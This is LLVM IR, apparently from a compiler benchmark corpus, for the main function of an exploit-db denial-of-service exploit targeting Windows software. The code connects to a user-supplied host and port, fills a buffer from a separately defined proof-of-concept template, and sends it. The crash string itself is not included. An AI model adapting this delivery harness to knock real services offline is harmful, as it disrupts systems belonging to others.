; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1416.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1416.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [31 x i8] c"[r] Connecting to remote host\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"[r] Creating buffer\0A\00", align 1
@POCSTR = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [36 x i8] c"[r] Sending %d bytes of DOS buffer\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"[e] Failed to send buffer\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"[s] Exploit Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 (...) @header()
  %9 = load i32, i32* %4, align 4
  %10 = icmp slt i32 %9, 5
  br i1 %10, label %11, label %16

11:                                               ; preds = %2
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @usage(i8* %14)
  br label %16

16:                                               ; preds = %11, %2
  %17 = call i64 @malloc(i32 1024)
  %18 = inttoptr i64 %17 to i8*
  store i8* %18, i8** %7, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 2
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25)
  %27 = call i32 @remote_connect(i8* %22, i32 %26)
  store i32 %27, i32* %6, align 4
  %28 = call i32 @sleep(i32 1)
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** @POCSTR, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 3
  %34 = load i8*, i8** %33, align 8
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 4
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @sprintf(i8* %30, i8* %31, i8* %34, i8* %37)
  %39 = load i8*, i8** %7, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i32 %40)
  %42 = load i32, i32* %6, align 4
  %43 = load i8*, i8** %7, align 8
  %44 = load i8*, i8** %7, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = call i64 @send(i32 %42, i8* %43, i32 %45, i32 0)
  %47 = icmp sle i64 %46, 0
  br i1 %47, label %48, label %53

48:                                               ; preds = %16
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %50 = load i32, i32* %6, align 4
  %51 = call i32 @close(i32 %50)
  %52 = call i32 @exit(i32 1) #3
  unreachable

53:                                               ; preds = %16
  %54 = call i32 @sleep(i32 1)
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %56 = load i32, i32* %6, align 4
  %57 = call i32 @close(i32 %56)
  %58 = load i8*, i8** %7, align 8
  %59 = call i32 @free(i8* %58)
  store i8* null, i8** %7, align 8
  ret i32 0
}

declare dso_local i32 @header(...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @remote_connect(i8*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
